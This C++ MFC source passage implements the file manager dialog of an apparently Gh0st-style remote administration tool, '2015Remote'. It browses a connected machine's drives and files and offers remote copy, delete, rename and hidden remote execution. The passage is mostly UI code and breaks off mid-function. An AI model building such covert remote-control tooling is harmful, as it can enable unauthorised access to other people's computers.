// FileManagerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "2015Remote.h"
#include "FileManagerDlg.h"
#include "FileTransferModeDlg.h"
#include "InputDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,
	ID_SEPARATOR
};

typedef struct {
	LVITEM* plvi;
	CString sCol2;
} lvItem, *plvItem;
/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg dialog


CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CFileManagerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CFileManagerDlg)
	//}}AFX_DATA_INIT
	m_bIsClosed = false;
	m_ProgressCtrl = NULL;
	SHFILEINFO	sfi;
	SHGetFileInfo
		(
		"\\\\",
		FILE_ATTRIBUTE_NORMAL, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES
		);
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_FATHER));
	// 加载系统图标列表
	static HIMAGELIST hImageList_Large = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
        sizeof(SHFILEINFO),
		SHGFI_LARGEICON | SHGFI_SYSICONINDEX
		);
	static CImageList *pLarge = CImageList::FromHandle(hImageList_Large);
	m_pImageList_Large = pLarge;

	// 加载系统图标列表
	static HIMAGELIST hImageList_Small = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
        sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
		);
	static CImageList *pSmall = CImageList::FromHandle(hImageList_Small);
	m_pImageList_Small = pSmall;

	// 初始化应该传输的数据包大小为0

	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	// 保存远程驱动器列表
	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
	PBYTE pSrc = m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	int length = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	if (length > 0)
		memcpy(m_bRemoteDriveList, pSrc, length);

	m_nTransferMode = TRANSFER_MODE_NORMAL;
	m_nOperatingFileLength = 0;
	m_nCounter = 0;

	m_bIsStop = false;
}


void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFileManagerDlg)
	DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
	DDX_Control(pDX, IDC_LOCAL_PATH, m_Local_Directory_ComboBox);
	DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
	DDX_Control(pDX, IDC_LIST_LOCAL, m_list_local);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialog)
	//{{AFX_MSG_MAP(CFileManagerDlg)
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_LOCAL, OnDblclkListLocal)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_LOCAL, OnBegindragListLocal)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_REMOTE, OnBegindragListRemote)
	ON_WM_MOUSEMOVE()
	ON_WM_LBUTTONUP()
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_REMOTE, OnDblclkListRemote)
	ON_COMMAND(IDT_LOCAL_PREV, OnLocalPrev)
	ON_COMMAND(IDT_REMOTE_PREV, OnRemotePrev)
	ON_COMMAND(IDT_LOCAL_VIEW, OnLocalView)
	ON_COMMAND(IDM_LOCAL_LIST, OnLocalList)
	ON_COMMAND(IDM_LOCAL_REPORT, OnLocalReport)
	ON_COMMAND(IDM_LOCAL_BIGICON, OnLocalBigicon)
	ON_COMMAND(IDM_LOCAL_SMALLICON, OnLocalSmallicon)
	ON_COMMAND(IDM_REMOTE_BIGICON, OnRemoteBigicon)
	ON_COMMAND(IDM_REMOTE_LIST, OnRemoteList)
	ON_COMMAND(IDM_REMOTE_REPORT, OnRemoteReport)
	ON_COMMAND(IDM_REMOTE_SMALLICON, OnRemoteSmallicon)
	ON_COMMAND(IDT_REMOTE_VIEW, OnRemoteView)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_STOP, OnUpdateLocalStop)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_STOP, OnUpdateRemoteStop)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_PREV, OnUpdateLocalPrev)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_PREV, OnUpdateRemotePrev)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_COPY, OnUpdateLocalCopy)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_COPY, OnUpdateRemoteCopy)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_DELETE, OnUpdateRemoteDelete)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_NEWFOLDER, OnUpdateRemoteNewfolder)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_DELETE, OnUpdateLocalDelete)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_NEWFOLDER, OnUpdateLocalNewfolder)
	ON_COMMAND(IDT_REMOTE_COPY, OnRemoteCopy)
	ON_COMMAND(IDT_LOCAL_COPY, OnLocalCopy)
	ON_COMMAND(IDT_LOCAL_DELETE, OnLocalDelete)
	ON_COMMAND(IDT_REMOTE_DELETE, OnRemoteDelete)
	ON_COMMAND(IDT_REMOTE_STOP, OnRemoteStop)
	ON_COMMAND(IDT_LOCAL_STOP, OnLocalStop)
	ON_COMMAND(IDT_LOCAL_NEWFOLDER, OnLocalNewfolder)
	ON_COMMAND(IDT_REMOTE_NEWFOLDER, OnRemoteNewfolder)
	ON_COMMAND(IDM_TRANSFER, OnTransfer)
	ON_COMMAND(IDM_RENAME, OnRename)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_LOCAL, OnEndlabeleditListLocal)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_REMOTE, OnEndlabeleditListRemote)
	ON_COMMAND(IDM_DELETE, OnDelete)
	ON_COMMAND(IDM_NEWFOLDER, OnNewfolder)
	ON_COMMAND(IDM_REFRESH, OnRefresh)
	ON_COMMAND(IDM_LOCAL_OPEN, OnLocalOpen)
	ON_COMMAND(IDM_REMOTE_OPEN_SHOW, OnRemoteOpenShow)
	ON_COMMAND(IDM_REMOTE_OPEN_HIDE, OnRemoteOpenHide)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_LOCAL, OnRclickListLocal)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE, OnRclickListRemote)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg message handlers


int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
	SHFILEINFO	sfi;
	if (dwFileAttributes == INVALID_FILE_ATTRIBUTES)
		dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
		(
		lpFileName,
		dwFileAttributes, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
		);

	return sfi.iIcon;
}

BOOL CFileManagerDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	RECT	rect;
	GetClientRect(&rect);

	/*为真彩工具条添加的代码*/

	// 一定要定义工具栏ID，不然RepositionBars会重置工具栏的位置
	// ID 定义在AFX_IDW_CONTROLBAR_FIRST AFX_IDW_CONTROLBAR_LAST
	// 本地工具条 CBRS_TOP 会在工具条上产生一条线
    if (!m_wndToolBar_Local.Create(this, WS_CHILD |
        WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, ID_LOCAL_TOOLBAR) 
		||!m_wndToolBar_Local.LoadToolBar(IDR_TOOLBAR1))
    {
        TRACE0("Failed to create toolbar ");
        return -1; //Failed to create
    }
	m_wndToolBar_Local.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_wndToolBar_Local.LoadTrueColorToolBar
		(
		24,    //加载真彩工具条
		IDB_TOOLBAR,
		IDB_TOOLBAR,
		IDB_TOOLBAR_DISABLE
		);
	// 添加下拉按钮
	m_wndToolBar_Local.AddDropDownButton(this, IDT_LOCAL_VIEW, IDR_LOCAL_VIEW);


    if (!m_wndToolBar_Remote.Create(this, WS_CHILD |
        WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, ID_REMOTE_TOOLBAR) 
		||!m_wndToolBar_Remote.LoadToolBar(IDR_TOOLBAR2))
    {
        TRACE0("Failed to create toolbar ");
        return -1; //Failed to create
    }
    m_wndToolBar_Remote.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
    m_wndToolBar_Remote.LoadTrueColorToolBar
		(
		24,    //加载真彩工具条    
		IDB_TOOLBAR,
		IDB_TOOLBAR,
		IDB_TOOLBAR_DISABLE
		);
	// 添加下拉按钮
	m_wndToolBar_Remote.AddDropDownButton(this, IDT_REMOTE_VIEW, IDR_REMOTE_VIEW);

	//显示工具栏
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);


	// 设置标题
	CString str;
	str.Format("%s - 文件管理",m_IPAddress);
	SetWindowText(str);

	// 为列表视图设置ImageList
	m_list_local.SetImageList(m_pImageList_Large, LVSIL_NORMAL);
	m_list_local.SetImageList(m_pImageList_Small, LVSIL_SMALL);
	// 创建带进度条的状态栏
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏	

	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
    m_ProgressCtrl->SetRange(0, 100);           //设置进度条范围
    m_ProgressCtrl->SetPos(20);                 //设置进度条当前位置
	
	FixedLocalDriveList();
	FixedRemoteDriveList();
	/////////////////////////////////////////////
	//// Set up initial variables
	m_bDragging = false;
	m_nDragIndex = -1;
	m_nDropIndex = -1;
	CoInitialize(NULL);
	SHAutoComplete(GetDlgItem(IDC_LOCAL_PATH)->GetWindow(GW_CHILD)->m_hWnd, SHACF_FILESYSTEM);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CFileManagerDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	// 状态栏还没有创建
	if (m_wndStatusBar.m_hWnd == NULL)
		return;
	// 定位状态栏
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示工具栏
	RECT	rect;
	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl->MoveWindow(&rect);
	
	GetDlgItem(IDC_LIST_LOCAL)->MoveWindow(0, 36, cx, (cy - 100) / 2);
	GetDlgItem(IDC_LIST_REMOTE)->MoveWindow(0, (cy / 2) + 28, cx, (cy - 100) / 2);
	GetDlgItem(IDC_STATIC_REMOTE)->MoveWindow(20, cy / 2, 25, 20);
	GetDlgItem(IDC_REMOTE_PATH)->MoveWindow(53, (cy / 2) - 4 , 210, 12);

	GetClientRect(&rect);
	//显示工具栏
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);
}

void CFileManagerDlg::FixedLocalDriveList()
{
	char	DriveString[256];
	char	*pDrive = NULL;
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0) != 0);
	m_list_local.InsertColumn(0, "名称",  LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "类型", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "总大小", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "可用空间", LVCFMT_LEFT, 115);

	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;

	char	FileSystem[MAX_PATH];
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间

	for (int i = 0; *pDrive != '\0'; i++, pDrive += lstrlen(pDrive) + 1)
	{
		// 得到磁盘相关信息
		memset(FileSystem, 0, sizeof(FileSystem));
		// 得到文件系统信息及大小
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		
		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		if (GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}

		int	nItem = m_list_local.InsertItem(i, pDrive, GetIconIndex(pDrive, GetFileAttributes(pDrive)));
		m_list_local.SetItemData(nItem, 1);
		if (lstrlen(FileSystem) == 0)
		{
			SHFILEINFO	sfi;
			SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
			m_list_local.SetItemText(nItem, 1, sfi.szTypeName);
		}
		else
		{
			m_list_local.SetItemText(nItem, 1, FileSystem);
		}
		CString	str;
		str.Format("%10.1f GB", (float)AmntMB / 1024);
		m_list_local.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_local.SetItemText(nItem, 3, str);
	}
	// 重置本地当前路径
	m_Local_Path = "";
	m_Local_Directory_ComboBox.ResetContent();

	ShowMessage("本地：装载目录 %s 完成", m_Local_Path);
}

void CFileManagerDlg::OnDblclkListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	if (m_list_local.GetSelectedCount() == 0 || m_list_local.GetItemData(m_list_local.GetSelectionMark()) != 1)
		return;
	FixedLocalFileList();
	*pResult = 0;
}

void CFileManagerDlg::FixedLocalFileList(CString directory)
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_local.GetSelectionMark();

		// 如果有选中的，是目录
		if (nItem != -1)
		{
			if (m_list_local.GetItemData(nItem) == 1)
			{
				directory = m_list_local.GetItemText(nItem, 0);
			}
		}
		// 从组合框里得到路径
		else
		{
			m_Local_Directory_ComboBox.GetWindowText(m_Local_Path);
		}
	}

	// 得到父目录
	if (directory == "..")
	{
		m_Local_Path = GetParentDirectory(m_Local_Path);
	}
	// 刷新当前用
	else if (directory != ".")
	{	
		m_Local_Path += directory;
		if(m_Local_Path.Right(1) != "\\")
			m_Local_Path += "\\";
	}

	// 是驱动器的根目录,返回磁盘列表
	if (m_Local_Path.GetLength() == 0)
	{
		FixedLocalDriveList();
		return;
	}

	m_Local_Directory_ComboBox.InsertString(0, m_Local_Path);
	m_Local_Directory_ComboBox.SetCurSel(0);

	// 重建标题
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0) != 0);
	m_list_local.InsertColumn(0, "名称",  LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);

	int			nItemIndex = 0;
	m_list_local.SetItemData
		(
		m_list_local.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
		);

	// i 为 0 时列目录，i 为 1时列文件
	for (int i = 0; i < 2; ++i)
	{
		CFileFind	file;
		BOOL		bContinue;
		bContinue = file.FindFile(m_Local_Path + "*.*");
		while (bContinue)
		{	
			bContinue = file.FindNextFile();
			if (file.IsDots())	
				continue;
			bool bIsInsert = !file.IsDirectory() == i;
	
			if (!bIsInsert)
				continue;

			int nItem = m_list_local.InsertItem(nItemIndex++, file.GetFileName(), 
				GetIconIndex(file.GetFileName(), GetFileAttributes(file.GetFilePath())));
			m_list_local.SetItemData(nItem,	file.IsDirectory());
			SHFILEINFO	sfi;
			SHGetFileInfo(file.GetFileName(), FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
			m_list_local.SetItemText(nItem, 2, sfi.szTypeName);

			CString str;
			str.Format("%10d KB", file.GetLength() / 1024 + (file.GetLength() % 1024 ? 1 : 0));
			m_list_local.SetItemText(nItem, 1, str);
			CTime time;
			file.GetLastWriteTime(time);
			m_list_local.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));
		}
	}

	ShowMessage("本地：装载目录 %s 完成", m_Local_Path);
}

void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList)
{
	//This routine performs the actual drop of the item dragged.
	//It simply grabs the info from the Drag list (pDragList)
	// and puts that info into the list dropped on (pDropList).
	//Send:	pDragList = pointer to CListCtrl we dragged from,
	//		pDropList = pointer to CListCtrl we are dropping on.
	//Return: nothing.

	////Variables
	// Unhilight the drop target

	if(pDragList == pDropList) //we are return
	{
		return;
	} //EO if(pDragList...

	pDropList->SetItemState(m_nDropIndex, 0, LVIS_DROPHILITED);

	if ((CWnd *)pDropList == &m_list_local)
	{
		OnRemoteCopy();
	}
	else if ((CWnd *)pDropList == &m_list_remote)
	{
		OnLocalCopy();
	}
	else
	{
		// 见鬼了
		return;
	}
	// 重置
	m_nDropIndex = -1;
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CFileManagerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CFileManagerDlg::OnBegindragListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	//// Save the index of the item being dragged in m_nDragIndex
	////  This will be used later for retrieving the info dragged
	m_nDragIndex = pNMListView->iItem;
	
	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;

	//We will call delete later (in LButtonUp) to clean this up
	
   	if(m_list_local.GetSelectedCount() > 1) //more than 1 item in list is selected
   		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
   	else
   		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);
	
	ASSERT(m_hCursor); //make sure it was created
	//// Change the cursor to the drag image
	////	(still must perform DragMove() in OnMouseMove() to show it moving)
	
	//// Set dragging flag and others
	m_bDragging = TRUE;	//we are in a drag and drop operation
	m_nDropIndex = -1;	//we don't have a drop index yet
	m_pDragList = &m_list_local; //make note of which list we are dragging from
	m_pDropWnd = &m_list_local;	//at present the drag list is the drop list
	
	//// Capture all mouse messages
	SetCapture();
	*pResult = 0;
}

void CFileManagerDlg::OnBegindragListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	//// Save the index of the item being dragged in m_nDragIndex
	////  This will be used later for retrieving the info dragged
	m_nDragIndex = pNMListView->iItem;
	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;	
	
	//We will call delete later (in LButtonUp) to clean this up
	
   	if(m_list_remote.GetSelectedCount() > 1) //more than 1 item in list is selected
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
   	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);
	
	ASSERT(m_hCursor); //make sure it was created
	//// Change the cursor to the drag image
	////	(still must perform DragMove() in OnMouseMove() to show it moving)
	
	//// Set dragging flag and others
	m_bDragging = TRUE;	//we are in a drag and drop operation
	m_nDropIndex = -1;	//we don't have a drop index yet
	m_pDragList = &m_list_remote; //make note of which list we are dragging from
	m_pDropWnd = &m_list_remote;	//at present the drag list is the drop list
	
	//// Capture all mouse messages
	SetCapture ();
	*pResult = 0;
}

void CFileManagerDlg::OnMouseMove(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	//While the mouse is moving, this routine is called.
	//This routine will redraw the drag image at the present
	// mouse location to display the dragging.
	//Also, while over a CListCtrl, this routine will highlight
	// the item we are hovering over.

	//// If we are in a drag/drop procedure (m_bDragging is true)
	if (m_bDragging)
	{	
		//SetClassLong(m_list_local.m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DRAG));

		//// Move the drag image
		CPoint pt(point);	//get our current mouse coordinates
		ClientToScreen(&pt); //convert to screen coordinates
		
		//// Get the CWnd pointer of the window that is under the mouse cursor
		CWnd* pDropWnd = WindowFromPoint (pt);

		ASSERT(pDropWnd); //make sure we have a window

		//// If we drag outside current window we need to adjust the highlights displayed
		if (pDropWnd != m_pDropWnd)
		{
			if (m_nDropIndex != -1) //If we drag over the CListCtrl header, turn off the hover highlight
			{
				TRACE("m_nDropIndex is -1\n");
				CListCtrl* pList = (CListCtrl*)m_pDropWnd;
				VERIFY (pList->SetItemState (m_nDropIndex, 0, LVIS_DROPHILITED));
				// redraw item
				VERIFY (pList->RedrawItems (m_nDropIndex, m_nDropIndex));
				pList->UpdateWindow ();
				m_nDropIndex = -1;
			}
		}
		
		// Save current window pointer as the CListCtrl we are dropping onto
		m_pDropWnd = pDropWnd;

		// Convert from screen coordinates to drop target client coordinates
		pDropWnd->ScreenToClient(&pt);
		
		//If we are hovering over a CListCtrl we need to adjust the highlights
		if(pDropWnd->IsKindOf(RUNTIME_CLASS (CListCtrl)))
		{			
			//Note that we can drop here
			SetCursor(m_hCursor);

			if (m_pDropWnd->m_hWnd == m_pDragList->m_hWnd)
				return;

			UINT uFlags;
			CListCtrl* pList = (CListCtrl*)pDropWnd;
			
			// Turn off hilight for previous drop target
			pList->SetItemState (m_nDropIndex, 0, LVIS_DROPHILITED);
			// Redraw previous item
			pList->RedrawItems (m_nDropIndex, m_nDropIndex);
			
			// Get the item that is below cursor
			m_nDropIndex = ((CListCtrl*)pDropWnd)->HitTest(pt, &uFlags);
			if (m_nDropIndex != -1)
			{
				// Highlight it
				pList->SetItemState(m_nDropIndex, LVIS_DROPHILITED, LVIS_DROPHILITED);
				// Redraw item
				pList->RedrawItems(m_nDropIndex, m_nDropIndex);
				pList->UpdateWindow();
			}
		}
		else
		{
			//If we are not hovering over a CListCtrl, change the cursor
			// to note that we cannot drop here
			SetCursor(LoadCursor(NULL, IDC_NO));
		}
	}	
	CDialog::OnMouseMove(nFlags, point);
}

void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	//This routine is the end of the drag/drop operation.
	//When the button is released, we are to drop the item.
	//There are a few things we need to do to clean up and
	// finalize the drop:
	//	1) Release the mouse capture
	//	2) Set m_bDragging to false to signify we are not dragging
	//	3) Actually drop the item (we call a separate function to do that)
	
	//If we are in a drag and drop operation (otherwise we don't do anything)
	if (m_bDragging)
	{
		// Release mouse capture, so that other controls can get control/messages
		ReleaseCapture();
		
		// Note that we are NOT in a drag operation
		m_bDragging = FALSE;
		
		CPoint pt (point); //Get current mouse coordinates
		ClientToScreen (&pt); //Convert to screen coordinates
		// Get the CWnd pointer of the window that is under the mouse cursor
		CWnd* pDropWnd = WindowFromPoint (pt);
		ASSERT (pDropWnd); //make sure we have a window pointer
		// If window is CListCtrl, we perform the drop
		if (pDropWnd->IsKindOf (RUNTIME_CLASS (CListCtrl)))
		{
			m_pDropList = (CListCtrl*)pDropWnd; //Set pointer to the list we are dropping on
			DropItemOnList(m_pDragList, m_pDropList); //Call routine to perform the actual drop
		}
	}	
	CDialog::OnLButtonUp(nFlags, point);
}

BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		if (pMsg->wParam == VK_ESCAPE)
				return true;
		if (pMsg->wParam == VK_RETURN)
		{
			if (
				pMsg->hwnd == m_list_local.m_hWnd || 
				pMsg->hwnd == ((CEdit*)m_Local_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd
				)
			{
				FixedLocalFileList();
			}
			else if 
				(
				pMsg->hwnd == m_list_remote.m_hWnd ||
				pMsg->hwnd == ((CEdit*)m_Remote_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd
				)
			{
				GetRemoteFileList();
			}
			return TRUE;
		}
		
	}
	// 单击除了窗口标题栏以外的区域使窗口移动
	if (pMsg->message == WM_LBUTTONDOWN && pMsg->hwnd == m_hWnd)
	{
		pMsg->message = WM_NCLBUTTONDOWN;
		pMsg->wParam = HTCAPTION;
	}
	/*
	UINT CFileManagerDlg::OnNcHitTest (Cpoint point )
	{
		UINT nHitTest =Cdialog: : OnNcHitTest (point )
			return (nHitTest = =HTCLIENT)? HTCAPTION : nHitTest
	}
	
	上述技术有两点不利之处，
		其一是在窗口的客户区域双击时，窗口将极大；
		其二， 它不适合包含几个视窗的主框窗口。
	*/

	if(m_wndToolBar_Local.IsWindowVisible())
	{
		CWnd* pWndParent = m_wndToolBar_Local.GetParent();
		m_wndToolBar_Local.OnUpdateCmdUI((CFrameWnd*)this, TRUE);
	}
	if(m_wndToolBar_Remote.IsWindowVisible())
	{
		CWnd* pWndParent = m_wndToolBar_Remote.GetParent();
		m_wndToolBar_Remote.OnUpdateCmdUI((CFrameWnd*)this, TRUE);
	}

	return CDialog::PreTranslateMessage(pMsg);
}

void CFileManagerDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	m_ProgressCtrl->StepIt();
	CDialog::OnTimer(nIDEvent);
}

void CFileManagerDlg::FixedRemoteDriveList()
{
	// 加载系统统图标列表 设置驱动器图标列表
	HIMAGELIST hImageListLarge = NULL;
	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(&hImageListLarge, &hImageListSmall);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	m_list_remote.DeleteAllItems();
	// 重建Column
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "名称",  LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "类型", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "总大小", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "可用空间", LVCFMT_LEFT, 115);

	char	*pDrive = NULL;
	pDrive = (char *)m_bRemoteDriveList;

	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间
	//char				VolName[MAX_PATH];
	//char				FileSystem[MAX_PATH];

	/*
	6	DRIVE_FLOPPY
	7	DRIVE_REMOVABLE
	8	DRIVE_FIXED
	9	DRIVE_REMOTE
	10	DRIVE_REMOTE_DISCONNECT
	11	DRIVE_CDROM
	*/
	int	nIconIndex = -1;
	for (int i = 0; pDrive[i] != '\0';)
	{
		if (pDrive[i] == 'A' || pDrive[i] == 'B')
		{
			nIconIndex = 6;
		}
		else
		{
			switch (pDrive[i + 1])
			{
			case DRIVE_REMOVABLE:
				nIconIndex = 7;
				break;
			case DRIVE_FIXED:
				nIconIndex = 8;
				break;
			case DRIVE_REMOTE:
				nIconIndex = 9;
				break;
			case DRIVE_CDROM:
				nIconIndex = 11;
				break;
			default:
				nIconIndex = 8;
				break;		
			}
		}	
		CString	str;
		str.Format("%c:\\", pDrive[i]);
		int	nItem = m_list_remote.InsertItem(i, str, nIconIndex);
		m_list_remote.SetItemData(nItem, 1);
	
		memcpy(&AmntMB, pDrive + i + 2, 4);
		memcpy(&FreeMB, pDrive + i + 6, 4);
		str.Format("%10.1f GB", (float)AmntMB / 1024);
		m_list_remote.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_remote.SetItemText(nItem, 3, str);
		
		i += 10;

		char	*lpFileSystemName = NULL;
